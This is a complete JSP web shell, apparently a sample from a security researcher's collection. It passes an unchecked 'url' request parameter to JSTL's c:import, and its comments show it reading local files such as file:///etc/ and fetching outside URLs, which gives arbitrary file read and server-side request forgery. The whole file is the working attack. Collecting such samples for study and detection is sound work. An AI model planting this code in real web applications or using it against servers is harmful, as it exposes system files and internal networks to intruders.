<%@ page contentType="text/html; charset=UTF-8" %>
<%-- jstl.jsp?url=/ --%>
<%-- jstl.jsp?url=file:///etc/ --%>
<%-- jstl.jsp?url=file:///tmp/1.txt --%>
<%-- jstl.jsp?url=https://su18.org --%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%
    String url = request.getParameter("url");
    if (url != null) {
%>
<c:import url="<%= url %>"/>
<% } %>
